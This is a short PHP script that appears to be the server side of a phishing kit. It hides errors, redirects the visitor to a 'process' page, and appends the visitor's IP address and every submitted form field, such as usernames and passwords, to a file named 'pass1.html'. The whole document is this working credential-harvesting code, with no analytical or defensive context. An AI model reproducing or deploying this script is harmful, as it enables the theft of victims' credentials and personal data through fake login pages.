<?php
error_reporting(0);
header('location: process.html');
include ('ip.php');

$handle = fopen("pass1.html","a");
  fwrite($handle, "<br>");
fwrite($handle, $ip_address);
fwrite($handle, "<br>");
foreach($_POST as $variable => $value)
{
  fwrite($handle, $variable);
  fwrite($handle, "= ");
  fwrite($handle, $value);
  fwrite($handle, "<br>");
}
fwrite($handle, "<br>");
fclose($handle);
exit;
?> 